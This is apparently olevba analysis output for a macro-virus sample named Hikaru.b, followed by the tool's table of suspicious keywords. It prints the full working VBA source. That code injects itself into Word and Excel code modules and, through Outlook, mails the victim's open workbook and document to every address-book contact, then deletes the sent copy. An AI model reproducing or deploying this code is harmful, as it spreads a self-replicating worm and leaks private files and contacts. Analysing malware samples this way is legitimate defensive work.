olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Hikaru.b-dff55aece15f09f98a56d8af4241dc870d495df4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSOffice.Hikaru.b-dff55aece15f09f98a56d8af4241dc870d495df4 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSOffice.Hikaru.b-dff55aece15f09f98a56d8af4241dc870d495df4 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSOffice.Hikaru.b-dff55aece15f09f98a56d8af4241dc870d495df4 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Hikaru.b-dff55aece15f09f98a56d8af4241dc870d495df4 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Copyright (C) 1998 by FlyShadow ~^^~ - Hikaru
Dim λ As String, ν As Byte
Private Sub Document_Close()
 On Error Resume Next
 ρ Application.VBE: ν = 1
 ρ GetObject(, "Word.Application").VBE
 ρ GetObject(, "Excel.Application").VBE
 Send
End Sub
Private Sub ρ(ByRef ο As Object)
 For ι = 1 To ο.CodePanes.Count
 Set υ = ο.CodePanes(ι).CodeModule
    If υ.Find("~^^~", 0, 0, 0, 0) And ν = 0 Then
        λ = υ.Lines(1, υ.CountOfLines): ν = 1: ι = 0
    End If
    If Not υ.Find("~^^~", 0, 0, 0, 0) And ν = 1 Then
        ο.CodePanes(ι).CodeModule.InsertLines 1, λ
    End If
 Next
End Sub
Private Sub Workbook_Deactivate(): Document_Close: End Sub
Private Sub UserForm_Initialize(): Document_Close: End Sub
Private Sub Worksheet_Activate(): Document_Close: End Sub
Private Sub Send()
On Error Resume Next
Set OLA = CreateObject("Outlook.Application")
For Each ALC In OLA.GetNameSpace("MAPI").AddressLists
If ALC.AddressEntries.Count <> 0 Then
Set FSS = OLA.CreateItem(0)
For FSN = 1 To ALC.AddressEntries.Count
FSS.BCC = FSS.BCC & "; " & ALC.AddressEntries(FSN).Address: Next
FSS.Subject = "Virus Alert!!!"
FSS.Body = "New O97M_Hikaru Virus." & Chr(13) & Chr(10) & "Exampler---------->"
FSS.Attachments.Add Application.ActiveWorkbook.FullName
FSS.Attachments.Add Application.ActiveDocument.FullName
FSS.DeleteAfterSubmit = 1
FSS.Send
End If: Next
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

